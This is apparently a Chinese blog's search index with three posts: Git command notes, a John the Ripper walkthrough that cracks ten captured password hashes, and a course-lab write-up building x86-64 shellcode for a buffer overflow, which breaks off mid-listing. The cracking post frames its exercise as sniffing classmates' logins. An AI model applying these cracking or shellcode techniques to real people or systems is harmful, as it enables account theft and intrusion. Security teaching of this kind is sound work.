<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Git技术笔记]]></title>
    <url>%2F2017%2F05%2F11%2FGit%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[这篇博文主要是对Git（而非Github）背景知识、管理操作的摘抄与整理，内容来源包括但不限于Pro Git、Stack Overflow。 版本控制系统的演变 保存文件修改记录 –&gt; 本地版本控制系统，如RCS。 与其他开发者合作 –&gt; 中心化版本控制系统，如CVS、Subversion、Perforce。 去除单点故障 –&gt; 分布式版本控制系统，如Git、Mercurial、Bazaar、Darcs。 Git历史 2002年开始，Linux内核社区使用BitKeeper对代码进行版本控制。 2005年，Linux内核社区与BitKeeper社区闹翻，Linus开始设计新版本系统。 Git最初的设计目标： 速度 简单 支持非线性开发（多个并行分支） 分布式 支持大工程 Git基本特性 其他版本控制系统（如CVS、Subversion、Perforce、Bazaar等等）主要记录文件及对文件的一系列修改操作；而Git记录文件在不同版本下的快照。 Git将工程的完整历史都保存在本地，因此受网络延迟的影响非常小。 Git对所有文件计算SHA-1校验和，用于区分文件，因此不可能绕开Git对文件进行修改，这保证了文件的完整性。 Git通常只允许添加数据，很难让系统执行不可逆操作或者删除数据。 Git拥有三个主要状态，分别为committed、modified与staged。 Git首次配置配置文件 /etc/gitconfig 全局配置文件 ~/.gitconfig、~/.config/git/config 用户配置文件 .git/config 项目配置文件 配置命令1234$ git config --global user.name &lt;user_name&gt;$ git config --global user.email &lt;user_email&gt;$ git config --global core.editor &lt;editor_name&gt;$ git config -l 基本操作 初始化一个仓库 123$ git init$ git add *.c$ git commit -m "initial project version" 克隆已存在的仓库 1$ git clone https://github.com/xxx/yyy.git [rename_dir] 检查文件状态 123456$ git status [-s] M READMEMM RakefileA lib/git.rbM lib/simplegit.rb?? LICENSE.txt 当使用-s简化输出时，文件状态用两列字符来表示，其中左列表示staging area的状态，右列表示working tree的状态。对于字符而言，??表示untracked文件，M表示modified文件，A表示added文件。 因此可以看出，README已被修改，但是并没有添加到staging area中，而Rakefile在修改并添加到staging area后，再次被修改。 忽略文件 123456789101112# ignore all .a files*.a# but do track lib.a, even though you&apos;re ignoring .a files above!lib.a# only ignore the TODO file in the current directory, not subdir/TODO/TODO# ignore all files in the build/ directorybuild/# ignore doc/notes.txt, but not doc/server/arch.txtdoc/*.txt# ignore all .pdf files in the doc/ directory and any of its subdirectoriesdoc/**/*.pdf 规则如下： 匹配符 #表示注释 !取反 /+pattern用于防止递归匹配 pattern+/用于表示目录 查看修改内容 1$ git diff [--staged|cached] 提交修改 123$ git commit [-v|s|a] [-m "message"]# -v对修改内容进行diff，打印出来# -a提交所有修改内容，不管是否已经staged 删除文件 12$ git rm [--cached] [-f]# --cached表示从staged area中删除 移动文件 1$ git mv file_from file_to 查看提交历史 123$ git log [-p] [-&lt;num&gt;] [--stat] [--pretty=&lt;format&gt;] [--graph]# -p对提交内容进行diff# --stat查看统计内容 使用git log -S symbol_name查看对该符号进行过修改的提交记录 重新提交，覆盖上一次commit 1$ git commit --amend 撤销staged状态 1$ git reset HEAD &lt;file&gt; 撤销对文件的修改 1$ git checkout -- &lt;file&gt; 打印远程仓库地址 1$ git remote -v 添加远程仓库 1$ git remote add &lt;shortname&gt; &lt;url&gt; 从远程仓库获取更新 1234$ git fetch &lt;remote-name&gt;# 不会自动和本地分支合并$ git pull &lt;remote-name&gt;# 自动fetch并和本地当前分支合并 更新远程仓库 1$ git push [remote-name] [branch-name] 检查远程仓库 1$ git remote show [remote-name] 修改/删除远程仓库名字 12$ git remote rename &lt;old-name&gt; &lt;new-name&gt;$ git remote remove &lt;remote-name&gt; 打印标签 1$ git tag [-l "v1.8.5*"] 新建标签 123456# annotated tags$ git tag -a v1.4 -m "my version 1.4"# lightweight tags$ git tag v1.4-lw$ git show v1.4 为之前的提交历史添加标签 1$ git tag -a v1.2 &lt;checksum&gt; 提交标签git push默认不会上传标签，必须显式地说明。 123$ git push origin [tagname]# or$ git push origin --tags 将工作目录切换到特定标签下 12# 需要新建一个分支$ git checkout -b version2 v2.0.0 需要注意的是，当该分支有了新的修改及提交后，原标签不会同步这一改动。 命令别名 12345$ git config --global alias.co checkout$ git config --global alias.br branch$ git config --global alias.unstage 'reset HEAD --'# use '!' to run an external command$ git config --global alias.visual '!gitk' 分支管理 创建新分支 123456git branch &lt;new_branch&gt;# orgit checkout -b &lt;new_branch&gt;# == git branch + git checkoutgit checkout -b &lt;new_branch&gt; &lt;remote&gt;/&lt;branch&gt;# 以远端分支为base 切换分支 1git checkout &lt;branch_name&gt; 查看分支历史 1git log --oneline --decorate --graph --all 删除分支 12git checkout -d/D &lt;branch_name&gt;# -D 强制删除，不会检测是否已经被合并 合并分支 12git merge &lt;branch_name&gt;# 将&lt;branch_name&gt;合并到HEAD指向的分支 解决分支合并冲突 123456# 查看冲突文件git status # 手动修改冲突内容# vim ...# 完成mergegit add &amp;&amp; git commit 列举分支 1234git branch [-v] [--merged/no-merged] [&lt;branch_name&gt;]# -v 是否显示各分支最后一次commit# --merged/no-merged 仅显示已经（或尚未）合并到当前分支的分支# &lt;branch_name&gt; 配合上一选项使用，以指定分支（而非当前分支）作为基准 列举远端分支 1234# 远端分支在本地用指针&lt;remote&gt;/&lt;branch&gt;来表示git ls-remote [remote]# orgit remote show [remote] 同步远端分支 12git fetch origin# 更新本地缓存的远端分支 更新远端分支 12345git push &lt;remote&gt; &lt;local_branch&gt;:&lt;remote_branch&gt;# 将本地的&lt;local_branch&gt;分支push到远端的&lt;remote_branch&gt;分支# orgit push &lt;remote&gt; &lt;branch&gt;# 将本地的&lt;branch&gt;分支push到远端的&lt;branch&gt;分支 缓存认证信息 12# 短时间内省去密码输入操作git config --global credential.helper cache tracking branchtracking branch是与远端分支直接对应的本地分支，进行pull操作时，git能够自动提供server地址与需要merge 的分支名。 123456git checkout -b &lt;new_branch&gt; &lt;remote&gt;/&lt;branch&gt;# orgit checkout --track &lt;remote&gt;/&lt;branch&gt;# orgit checkout &lt;new_branch&gt;# 当&lt;new_branch&gt;与本地缓存的远端分支同名时，可以自动新建一个tracking branch 修改upstream branch 12git branch -u/--set-upstream-to &lt;remote&gt;/&lt;branch&gt;# 修改当前tracking branch的upstream branch upstream branch别名当前tracking branch的upstream branch可以用@{u}、@{upstream}来表示。 1234# @&#123;u&#125;, @&#123;upstream&#125;git merge @&#123;u&#125;# orgit checkout @&#123;u&#125; 列举track关系 1git branch -vv 删除远端分支 1git push &lt;remote&gt; --delete &lt;branch&gt; rebase 123456git rebase &lt;branch&gt;# 将当前分支rebase到&lt;branch&gt;上git rebase &lt;base_branch&gt; &lt;topic_branch&gt;# 将&lt;topic_branch&gt;分支rebase到&lt;base_branch&gt;上git rebase --onto &lt;base_branch&gt; &lt;new_branch1&gt; &lt;new_branch2&gt;# 以&lt;base_branch&gt;作为base，将&lt;new_branch2&gt;从&lt;new_branch1&gt;分叉后的所有commit重新apply一遍，具体应用见下 初始状态rebase命令：$ git rebase --onto master server client结果： 自动rebase 12345git pull --rebase# 采用rebase，而非merge# == git fetch + git rebase &lt;remote&gt;/&lt;branch&gt;git config --global pull.rebase true# 设置默认采用rebase 注意事项Never rebase anything you’ve pushed somewhere.If you treat rebasing as a way to clean up and work with commits before you push them, and if you only rebase commits that have never been available publicly, then you’ll be fine. If you rebase commits that have already been pushed publicly, and people may have based work on those commits, then you may be in for some frustrating trouble, and the scorn of your teammates. To Be Continued]]></content>
      <tags>
        <tag>Study Notes</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用John the Ripper破解密码]]></title>
    <url>%2F2016%2F06%2F01%2F%E4%BD%BF%E7%94%A8John-the-Ripper%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[假设这么一个场景：你和几个同学在一间教室里上课，大家都通过校园wifi上网，你想获取他们的教务网密码，于是你开始抓包，然后故意找机会让那几位同学尝试登陆教务网(这里就是社工了)，最后你根据抓到的数据包开始尝试破解登陆密码。 Start from here 假设这是你抓到的数据包: password.pcap。我们知道，即便只是一次普普通通的教务网登陆过程，其中也会涉及到很多次的信息交互，比如TCP三次握手、四次挥手，HTTP各种请求与响应等等，所以我们抓到的包中有很多是无用的，我们真正关心的是那些携带了密码的数据包，那么怎么才能找到这些包呢？ 这里涉及到HTTP协议的一些细节，我们知道HTTP有两种认证方式，分别为基本认证(Basic Authentication)和摘要认证(Digest Authentication)，具体的细节这里不展开，我们只需要知道一点，无论采用哪种认证方式，HTTP请求包头部都会带有一个Authorization的字段，对应的值即为用户名+盐+密码经过hash后的字符串。 根据这一点特征，我们可以利用Wireshark分析抓到的数据包(password.pcap)，然后在filter里填入一个简简单单的规则http contains Authorization，即可过滤出真正带有认证信息的数据包： 可以看到，仅有十个数据包通过筛选，并且从HTTP请求头部可以看出，用户身份认证采用的是基本认证的方式，而基本认证无法向传输的Credentials提供有意义的安全保护，仅仅是将其进行Base64编码。我们可以直接提取到用户密码信息，比如对于上图显示的HTTP认证包，用户Credentials即为user1:$1$foo$xxxxxxx，这里user1表示用户名，\$1表示hash类型为MD5，$foo表示采用foo作为hash的盐，最后一串字符即为密码的hash结果。我们可以将十个数据包里的所有Credentials全部提取下来，存入一个文件中，然后开始对密码进行破解。 这里我们使用John the Ripper对密码进行破解，John是一个非常强大的工具，这里不展开，直接在实践过程中介绍其用法。 下载John的源码压缩包之后，将其解压，然后根据README文档的指导直接编译安装即可。安装完成后，进入run目录，注意到该目录下有这么几个文件：john、password.lst、john.conf，其中john不用说，就是我们用来破解密码的可执行程序，password.lst是官方默认的一个密码字典，里面存放了3000多个简单密码，john.conf顾名思义就是破解密码时所用到的规则信息。 建议大家在真正使用John之前，先看一下doc目录下的各个文档，尤其是EXAMPLES和RULES两个文档，这两篇文档详细介绍了John的各种使用方法以及所有规则的含义。 将前面抓到的10条Credentials保存为文件allpasswd，首先，我们尝试最简单的破解方法：12345678~/Documents/*** ⌚ 20:36:24$ ./john --single allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Press 'q' or Ctrl-C to abort, almost any other key for statususer1 (user1)1g 0:00:00:00 100% 1.612g/s 11998p/s 11998c/s 108001C/s user21900Use the "--show" option to display all of the cracked passwords reliablySession completed 注意到，我们成功破解出了用户user1的密码，即为user1！这个是怎么破解出来的呢？其实我们这里是用到了John一个最基本的模式——Single Crack，根据官方文档的说法(It will use the login names, “GECOS” / “Full Name” fields, and users’ home directory names as candidate passwords, also with a large set of mangling rules applied)，我们知道在这种模式下，John直接将用户名等账户信息作为候选密码来进行验证，同时也支持一些mangling rules，即我们能够通过自己设计规则，来生成更多的候选密码。举个例子，假设有这么一条规则：在输入字符串的末尾添加一个字母或数字，作为新的候选密码，那么对于用户user1，根据这么一个规则，我们知道user1、user1a、user1D、user19都将成为候选密码。总的来说，Single Crack这种模式速度非常快，因为它的输入不多，仅有几条有限的用户信息，当然，相对应地，由于它的输入局限于用户账户信息，这也导致它很难破解一些与用户名完全不同的密码。最明显的，上面的实践中，我们提供了10条用户Credentials，但John只破解出了user1的密码。 既然Single Crack模式无法破解所有密码，那么我们尝试使用官方自带的字典：12345678910~/Documents/*** ⌚ 20:36:29$ ./john --wordlist=password.lst allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 9 password hashes with no different saltsPress 'q' or Ctrl-C to abort, almost any other key for statussmile (user3)admin (user2)2g 0:00:00:00 100% 5.882g/s 10429p/s 10429c/s 81617C/s notused..sssUse the "--show" option to display all of the cracked passwords reliablySession completed 我们又破解出了两个新密码！这次我们使用的是Wordlist模式，在这种模式下，John会打开我们指定的密码字典文件，将里面的所有字符串作为候选密码，一个个尝试去验证。所以说，一旦某个用户的密码在password.lst中出现了，那么这种模式就能很快地将其破解出来：1234567~/Documents/*** ⌚ 20:57:05$ grep -n '^smile$' password.lst104:smile~/Documents/*** ⌚ 20:57:20$ grep -n '^admin$' password.lst2823:admin 可以看到，smile和admin这两个密码确实存在于password.lst中。然而，仅仅几千条记录的字典无法覆盖所有用户的密码，如果用户密码没有出现在字典中，但和其中的某条记录很接近，比如字典中存在hello，而用户的密码是hel1lo，我们该怎么继续利用字典来破解这一密码呢？这里就需要用到John提供的mangling rules了，我们可以设计这么一条规则：12345&gt;[1-9] i\0[a-zA-Z0-9]# &gt;[1-9]表示对于1-9中的任意一个数字，当输入单词的长度比它大时，执行之后的规则# i代表insert，后面跟两个参数，分别为插入位置与插入字符，比如iNX表示在N位置上插入一个字符X# \0即为插入位置，举个例子，如果输入单词长度为6，那么这里的\0表示[1-5]，如果输入单词长度为12，那么这里的\0表示[1-9]，所以\0可以理解为是规则&gt;[1-9]的满足范围# [a-zA-Z0-9]即为插入字符，比较容易理解，就是普通正则的用法，这里表示插入一个英文字母或数字。 为了将规则应用到破解中，我们需要修改john.conf文件，在[List.Rules:Wordlist]一节添加这条规则；当然也可以直接新建一个john.conf文件，只使用这一条规则，如下所示：1234567891011121314[Options]# Wordlist file name, to be used in batch modeWordlist = $JOHN/password.lst# Use idle cycles onlyIdle = Y# Crash recovery file saving delay in secondsSave = 600# Beep when a password is found (who needs this anyway?)Beep = N# "Single crack" mode rules[List.Rules:Wordlist]:&gt;[0-9] i\0[a-zA-Z0-9&amp;!@#$%^&amp;*=+.|?:"'_-] # 密码不一定是数字或字母，也有可能是特殊字符 我们再次尝试破解，这次我们需要加上--rules选项，表示我们需要将定义的规则应用在字典单词上：1234567891011121314151617181920212223242526272829~/Documents/*** ⌚ 11:17:11$ ./john --fork=6 --wordlist=password.lst --rules allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 7 password hashes with no different saltsNode numbers 1-6 of 6 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statusalphab6et (user7)2 0g 0:00:00:25 100% 0g/s 11697p/s 11697c/s 81879C/s butterfly]1..rastafari]an6 1g 0:00:00:25 100% 0.03920g/s 11480p/s 11480c/s 79715C/s jesuschri]stpassworld (user8)1 0g 0:00:00:26 100% 0g/s 11398p/s 11398c/s 79788C/s jesucrist]o..nightshad]eWaiting for 5 children to terminate5 0g 0:00:00:26 100% 0g/s 11170p/s 11170c/s 78193C/s instructo]r..newaccoun]t3 1g 0:00:00:26 100% 0.03707g/s 10933p/s 10933c/s 76150C/s mancheste]r..bestfrien]ds4 0g 0:00:00:27 100% 0g/s 10757p/s 10757c/s 75299C/s jethrotul]lSession completed~/Documents/*** ⌚ 11:18:12$ ./john --show allpasswduser1:user1user2:adminuser3:smileuser7:alphab6etuser8:passworld5 password hashes cracked, 5 left~/Documents/*** ⌚ 11:18:12$ 现在已经成功破解了5个密码。然后，根据实验提示，字典文件提供了很多单词，而密码可能是两个单词的组合，比如helloworld就是hello和world的组合。所以我们需要将字典文件里的单词两两组合，重新验证，不过John貌似没有规则能够让我们同时接收两个单词，并组合起来进行验证，所以这里需要用到脚本程序，自己重新构造一个具有单词组合的新字典文件。脚本程序如下所示：12345678910111213141516171819########################################################################## File Name: tran.sh# Author: Hac# Mail: hac@zju.edu.cn# Created Time: Fri 20 May 2016 11:33:08 AM CST##########################################################################!/bin/bashfile=$1while read a;do while read b; do c=$a$b if [ $&#123;#c&#125; -le 10 ] &amp;&amp; [ $&#123;#c&#125; -ge 3 ]; then # 过滤掉那些比较长或比较短的组合 echo "$a$b" &gt;&gt; newPasswd.lst fi done &lt; $filedone &lt; $file 这个程序应该不难理解，直接通过两层循环读取单词，做一个笛卡尔积。运行这个脚本，我们能够在原字典文件的基础上，构造出一个新的字典文件，其中的单词全部是两个基础单词的组合。基于这个新的字典文件，我们再尝试使用之前的规则进行破解：12345678910111213141516171819202122232425~/Documents/*** ⌚ 22:50:44$ ./john --fork=6 --wordlist=newPasswd.lst --rules allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 5 password hashes with no different saltsNode numbers 1-6 of 6 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statuslovecats (user6)password222 (user4)amy!password (user9)love&amp;pizza (user10)Session completed~/Documents/*** ⌚ 23:17:07$ ./john --show allpasswduser1:user1user2:adminuser3:smileuser4:password222user6:lovecatsuser7:alphab6etuser8:passworlduser9:amy!passworduser10:love&amp;pizza9 password hashes cracked, 1 left 这次破解会花费很长时间，主要是因为所使用的字典文件更大了。原来的字典文件只有3500多行，而我们将其中的单词两两组合(排除过长或过短的密码)后，新字典文件的行数达到了千万级别。花费了非常多的时间，我们的收获还是挺大的，这一次我们直接破解出了4个密码，分别是user4、user6、user9以及user10。现在，10个用户中只剩下user5的密码没有破解出来。 还剩下一个用户的密码没有破解。如果此时没有任何提示信息，那么我们就可以动用John的另一种非常强大的工作模式——Incremental。根据官方文档的说明，Incremental是John最强大的一种工作模式，因为它会尝试所有可能的字符组合，说白了就是真正的暴力破解。这种模式并没有尽头，因为字符组合有太多可能性，几乎不太可能在有限时间内穷举出所有字符组合。不过我们可以通过指定密码长度的范围，来减小字符组合的可能性，从而使得Incremental模式下的John能更快地破解出密码。 12345678910111213141516171819# john.conf# Incremental modes[Incremental:ASCII]File = $JOHN/ascii.chrMinLen = 4MaxLen = 8CharCount = 95[Incremental:LM_ASCII]File = $JOHN/lm_ascii.chrMinLen = 4MaxLen = 8CharCount = 69[Incremental:Digits]File = $JOHN/digits.chrMinLen = 4MaxLen = 8CharCount = 10 下面我们尝试使用Incremental模式对最后一个用户密码进行破解： 123456789101112131415161718192021222324252627282930~/Documents/*** ⌚ 23:21:20$ ./john --fork=6 --incremental allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 1 password hashNode numbers 1-6 of 6 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statuspass2012 (user6)6 0g 0:00:01:00 0g/s 9890p/s 9890c/s 9890C/s lilachu..lilach13 0g 0:00:01:00 0g/s 9650p/s 9650c/s 9650C/s pops1c4..pops1c34 0g 0:00:01:00 0g/s 9681p/s 9681c/s 9681C/s 14015j..14014n2 0g 0:00:01:00 0g/s 10071p/s 10071c/s 10071C/s cattored..cattore15 0g 0:00:01:00 0g/s 9949p/s 9949c/s 9949C/s maydi15..maydi161 0g 0:00:01:00 0g/s 10252p/s 10252c/s 10252C/s chserz..chselyWaiting for 5 children to terminateSession aborted~/Documents*** ⌚ 23:22:48$ ./john --show allpasswduser1:user1user2:adminuser3:smileuser4:password222user5:pass2012user6:lovecatsuser7:alphab6etuser8:passworlduser9:amy!passworduser10:love&amp;pizza10 password hashes cracked, 0 left 如上所示，我们成功通过Incremental模式破解出了最后一个用户的密码。 Reference Lecture Homepage(仅学校内网可访问) John the Ripper官方文档(EXAMPLES和RULES两个章节非常重要)]]></content>
      <tags>
        <tag>Security</tag>
        <tag>Password</tag>
        <tag>John the Ripper</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Buffer Overflow实践]]></title>
    <url>%2F2016%2F05%2F11%2FBuffer-Overflow%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[上个世纪末，Buffer Overflow是黑客最常用的攻击手段之一，主要原因是当时操作系统以及各种函数库都不够完善，并没有实现对堆栈的保护，黑客可以随意地冲破缓冲区长度限制，直接修改函数返回地址，使程序跳到黑客所希望的地方，让它做一些奇奇怪怪的事，从而达到攻击的目的。这样的攻击方法就叫Return-Oriented Programming，简称ROP。常见的实现手段有两种，其一是黑客向栈中注入自己设计的代码，然后将函数返回地址改成注入代码的起始位置，因此当函数返回时，程序就开始执行这段注入代码了，所以黑客想干嘛就能让程序干嘛。这种攻击方式非常强大，但有一个致命缺陷，它要求栈是可执行的(executable)，一旦栈是不可执行的，那么函数返回后，程序就因为错误而被终止(我们可以通过在gcc编译时加选项设定栈是否可执行)。另一种方法就是专门针对不可执行栈的，黑客不再向栈中注入自己的执行代码，而是通过各种黑科技来找到程序中的gadget(具体方法参照MIT 6-858第三节课，也有现成工具可以实现)，gadget是一些指令片段，常见的就是ret和pop的组合，黑客的目的在于，找到很多个这样的gadget后，将它们链接在一起，形成gadget chain，也就是一段执行代码。。。总的来说，黑客在无法自己注入代码时，他可以东拼西凑找现有的代码，把它们当成零件组装成自己想要的程序代码。这种实现方式难度极大，就跟拼图一样，真的要耐住性子才能成功。 MIT 6-858这门课的第一个实验就是分析一个web服务器的存在的漏洞，并利用这些漏洞实现Buffer Overflow攻击，分别涉及到可执行栈与不可执行栈，最后再修复这些漏洞。不得不说，MIT的实验难度和本校的实验难度完全不是一个level的，我们的实验是一种跟着做的形式，最后也只是跑了一个shell出来，而MIT的实验几乎就是真实的hack。我至今还没有完成这次实验，主要是自己对汇编不是很熟悉，然后也耐不住性子连续花上几天时间来调试，有兴趣的同学可以去看一下，这是链接。实验要求使用虚拟机跑MIT提供的系统镜像，保证运行环境一致，这里建议大家使用Linux+kvm来做实验，非常方便。 下面介绍我对Buffer Overflow的实践，内容是本校「信息安全综合实验」课程第二、三次实验——通过注入代码，使一个正常的程序能够运行shell。 Start from here 总的来说，实验思路还是挺明了的，我们需要自己设计一段能运行shell的汇编代码，然后汇编成机器码，并注入到某个程序的堆栈中，最后修改ip寄存器，使程序执行我们注入的这段代码，从而跑出一个shell来。实验难度也不大，主要是要有耐心，毕竟本次实验涉及到大量的GDB调试操作，对GDB命令不熟悉的同学可能会吃些亏，因为调试过程会使用到一些较为复杂的命令参数。当然，只使用光秃秃的原始命令也是能够完成实验的，但会浪费一些时间。另外，实验环境为64位Linux系统，所以难度可能会稍微大一些，因为网上关于Buffer Overflow的实践教程全部都是基于32位系统的，我们只能靠自己来慢慢摸索。 Design Shell Code 我们第一个任务是设计一串能够执行shell的机器指令，但我们知道，不同机器有不同的指令集，不同系统对系统调用的处理也不一样，那该怎么保证我们最终注入的代码能够正常工作呢？ 答案很简单，我们直接找一个能在目的主机上运行的程序，仿照设计。如下所示即为我们的样例程序：123456789// sample.c#include &lt;stdio.h&gt;int main() &#123; char *array[2]; array[0] = "/bin/sh"; array[1] = NULL; execve(array[0], array, NULL); return 0;&#125; 这个程序通过execve函数产生系统调用，使进程执行shell。我们可以观察该程序编译得到的汇编代码，找到执行shell需要哪些关键步骤，然后自己重新组织，即可设计出一串能执行shell的机器指令。 这里使用gcc进行编译，注意添加两种重要选项，分别是-g与-static，分别代表生成调试信息、采用静态链接，这样可以方便我们进行调试。编译完成后，使用GDB查看二进制文件的机器指令，如下所示：123456789101112131415161718192021222324252627# main function │0x401164 &lt;main&gt; push %rbp # 保存旧的rbp，即caller的frame pointer │0x401165 &lt;main+1&gt; mov %rsp,%rbp # 获取新的rbp，即callee的frame pointer │0x401168 &lt;main+4&gt; sub $0x10,%rsp # 分配栈空间，两个指针需要占用16字节B+&gt;│0x40116c &lt;main+8&gt; movq $0x495d64,-0x10(%rbp) # array[0]赋值 │0x401174 &lt;main+16&gt; movq $0x0,-0x8(%rbp) # array[1]赋值 │0x40117c &lt;main+24&gt; mov -0x10(%rbp),%rax # 将array[0]赋给rax │0x401180 &lt;main+28&gt; lea -0x10(%rbp),%rcx # 将array，即array[0]的地址赋给rcx │0x401184 &lt;main+32&gt; mov $0x0,%edx # 将NULL赋给edx │0x401189 &lt;main+37&gt; mov %rcx,%rsi │0x40118c &lt;main+40&gt; mov %rax,%rdi │0x40118f &lt;main+43&gt; callq 0x40ef30 &lt;execve&gt; # 调用execve │0x401194 &lt;main+48&gt; mov $0x0,%eax # “return 0”中的0 │0x401199 &lt;main+53&gt; leaveq # 这里会将0x8(%rbp)赋给%rip，即恢复返回地址 │0x40119a &lt;main+54&gt; retq# execve function │0x40ef30 &lt;execve&gt; mov $0x3b,%eax # 将0x3b赋给%eax │0x40ef35 &lt;execve+5&gt; syscall # 系统调用，到此为止，之后的指令我们不用care │0x40ef37 &lt;execve+7&gt; cmp $0xfffffffffffff000,%rax │0x40ef3d &lt;execve+13&gt; ja 0x40ef41 &lt;execve+17&gt; │0x40ef3f &lt;execve+15&gt; repz retq │0x40ef41 &lt;execve+17&gt; mov $0xffffffffffffffc0,%rdx │0x40ef48 &lt;execve+24&gt; neg %eax │0x40ef4a &lt;execve+26&gt; mov %eax,%fs:(%rdx) │0x40ef4d &lt;execve+29&gt; or $0xffffffffffffffff,%rax │0x40ef51 &lt;execve+33&gt; retq 以上即为整个程序的汇编代码，大家按照注释对整个流程分析一遍以后，基本上就能总结出执行shell的几个必要条件了： 1. 内存中存在字符串/bin/sh，以\x00结束 2. 内存中存在一个8字节的区域存放字符串的地址，后面跟着一个8字节的0 3. 将以上16字节区域的起始地址存入%rsi中 4. 将字符串地址存入%rdi中 5. 将NULL存入%rdx中 6. 将0x3b存入%rax中(不用纠结%eax或者%rax) 7. 系统调用，syscall指令 此时，我们只需要针对以上需求，自己设计汇编代码即可。然而，现实总是很残酷，第1点需求估计就能难倒不少人，把字符串加载到内存不难，直接用.string即可，但是我们怎么获取该字符串的地址呢？莫非只能通过手工计算？那样该多麻烦呀！在这里我想了很久，最终想出的办法是直接往栈里写入/bin/sh，地址可以通过对%rsp加加减减获得，但这样的方法非常不优雅，一旦我们不再执行/bin/sh，想换为/usr/local/bin/zsh，那么我们的代码需要进行大幅度的修改。后来在Phrack上看到一个很tricky的办法，它很好的利用了call指令的特性，实现字符串地址的自动获取： 12345678# 非常妙的一种思路 jmp bbbaaa: do sth # 执行到这里时，%rsp所指向的8字节堆栈空间存放的就是"/bin/sh"的起始地址 ...bbb: call aaa # 执行这条指令时，会自动将下一条指令的地址压入堆栈 .string "/bin/sh" 这样一来，我们就解决了获取字符串地址的问题，接下来的几个需求都很容易实现，这里就不做具体介绍，直接贴出我设计的一段代码： 1234567891011121314151617# shell_1.smain: jmp bbbaaa: movq $0x0, %rax movq %rax, 0x8(%rsp) # array[1]赋值为NULL，对应第2点需求 movq 0x0(%rsp), %rdi # array[0]，即字符串地址，对应第4点需求 lea 0x0(%rsp), %rsi # array，对应第3点需求 movq $0x0, %rdx # NULL，对应第5点需求 movl $0x3b, %eax # 对应第6点需求 syscall # 对应第7点需求bbb: callq aaa .string "/bin/sh" # 对应第1点需求 .global main .type main, @function 使用gcc编译这段汇编代码，获得可执行文件，并运行： It works!!! 可以看到，程序执行之前我们使用的shell是bash，而在程序执行以后，我们使用的shell是/bin/sh，这说明我们的代码能够正常产生execve系统调用。 好，这样是不是就已经完成我们的第一部分工作——Design Shell Code了呢？当然并没有这么简单！我们来分析一下这个程序可能存在的问题。首先，如果execve系统调用失败了会如何？很简单，在执行完syscall指令以后，由于系统调用失败，程序并不会发生跳转，而是继续执行下一条指令，也就是callq aaa指令，显然这将导致死循环，最终导致程序崩溃。有兴趣的同学可以自己做一个小实验，把系统调用的三个参数修改一下，然后重新编译运行，我们会发现程序卡住一段时间，然后自动崩溃，并报错Segmentation fault (core dumped)。为了解决这一隐患，我们可以在原有的syscall指令后面再添加几条指令，调用exit，强行终止程序。这几条指令的设计和之前执行shell指令的设计原理类似，我们编写一个简单的C程序，其中调用exit(0)，然后将其编译得到可执行文件，观察exit这个系统调用需要哪些条件，我们再有针对性的为其设计指令即可： 12345// sample2.c#include &lt;stdlib.h&gt;int main() &#123; exit(0);&#125; 程序汇编指令如下所示：123456789101112131415161718192021222324252627282930313233343536373839404142434445# main function │0x401164 &lt;main&gt; push %rbp │0x401165 &lt;main+1&gt; mov %rsp,%rbpB+&gt;│0x401168 &lt;main+4&gt; mov $0x0,%edi │0x40116d &lt;main+9&gt; callq 0x401c00 &lt;exit&gt;# exit function │0x401c00 &lt;exit&gt; sub $0x8,%rsp │0x401c04 &lt;exit+4&gt; mov $0x1,%edx │0x401c09 &lt;exit+9&gt; mov $0x6c1080,%esi │0x401c0e &lt;exit+14&gt; callq 0x401b00 &lt;__run_exit_handlers&gt;# __run_exit_handlers function # ... 省略 │0x401bdd &lt;__run_exit_handlers+221&gt; add $0x8,%rbp │0x401be1 &lt;__run_exit_handlers+225&gt; cmp $0x4b3050,%rbp │0x401be8 &lt;__run_exit_handlers+232&gt; jb 0x401bda &lt;__run_exit_handlers+218&gt; │0x401bea &lt;__run_exit_handlers+234&gt; mov %ebx,%edi &gt;│0x401bec &lt;__run_exit_handlers+236&gt; callq 0x40eec0 &lt;_exit&gt; # ... 省略# _exit function │0x40eec0 &lt;_exit&gt; movslq %edi,%rdx │0x40eec3 &lt;_exit+3&gt; mov $0xffffffffffffffc0,%r9 │0x40eeca &lt;_exit+10&gt; mov $0xe7,%r8d │0x40eed0 &lt;_exit+16&gt; mov $0x3c,%esi │0x40eed5 &lt;_exit+21&gt; jmp 0x40eef0 &lt;_exit+48&gt; │0x40eed7 &lt;_exit+23&gt; nopw 0x0(%rax,%rax,1) │0x40eee0 &lt;_exit+32&gt; mov %rdx,%rdi │0x40eee3 &lt;_exit+35&gt; mov %esi,%eax │0x40eee5 &lt;_exit+37&gt; syscall │0x40eee7 &lt;_exit+39&gt; cmp $0xfffffffffffff000,%rax │0x40eeed &lt;_exit+45&gt; ja 0x40ef08 &lt;_exit+72&gt; │0x40eeef &lt;_exit+47&gt; hlt │0x40eef0 &lt;_exit+48&gt; mov %rdx,%rdi │0x40eef3 &lt;_exit+51&gt; mov %r8d,%eax &gt;│0x40eef6 &lt;_exit+54&gt; syscall │0x40eef8 &lt;_exit+56&gt; cmp $0xfffffffffffff000,%rax │0x40eefe &lt;_exit+62&gt; jbe 0x40eee0 &lt;_exit+32&gt; │0x40ef00 &lt;_exit+64&gt; neg %eax │0x40ef02 &lt;_exit+66&gt; mov %eax,%fs:(%r9) │0x40ef06 &lt;_exit+70&gt; jmp 0x40eee0 &lt;_exit+32&gt; │0x40ef08 &lt;_exit+72&gt; neg %eax │0x40ef0a &lt;_exit+74&gt; mov %eax,%fs:(%r9) 